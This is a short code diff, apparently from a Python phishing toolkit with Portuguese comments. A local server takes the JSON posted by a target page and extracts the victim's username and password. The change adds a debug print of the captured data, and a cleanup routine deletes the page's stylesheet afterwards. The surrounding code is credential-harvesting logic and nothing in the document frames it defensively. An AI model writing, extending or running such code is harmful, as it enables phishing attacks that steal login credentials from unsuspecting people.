@@ -349,6 +349,9 @@ def run_local_server(target_url, language):
                 post_data = self.rfile.read(content_length).decode('utf-8')
                 data = json.loads(post_data)
 
+                # Debugging: Print the received data to check what is being captured
+                print("Received data:", data)
+
                 # Captura das credenciais
                 username = data.get('username', '')
                 password = data.get('password', '')
@@ -398,7 +401,7 @@ def clean_up_files():
         os.remove('styles.css')
     except Exception as e:
         print(f"Error cleaning up files: {e}")
-        
+
 # Função para informações de número de telefone
 def phone_number_info(language):
     clear_console()
